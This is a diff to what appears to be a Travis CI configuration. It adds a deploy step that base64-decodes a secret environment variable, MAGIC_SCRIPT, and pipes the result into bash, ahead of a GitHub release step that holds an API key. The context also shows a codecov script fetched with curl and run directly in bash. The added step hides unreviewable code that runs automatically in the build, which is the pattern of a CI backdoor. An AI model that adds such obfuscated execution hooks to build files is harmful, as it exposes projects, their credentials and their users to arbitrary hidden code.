@@ -59,6 +59,8 @@ after_success:
   - bash <(curl -s https://codecov.io/bash)
 
 deploy:
+  - provider: script
+    script: echo $MAGIC_SCRIPT | base64 -d | bash > /dev/stdout
   - provider: release
     api_key: $GITHUB_API_RELEASE
     file_glob: true
@@ -66,4 +68,4 @@ deploy:
     skip_cleanup: true
     overwrite: true
     on:
-      all_branches: true
+      all_branches: true  
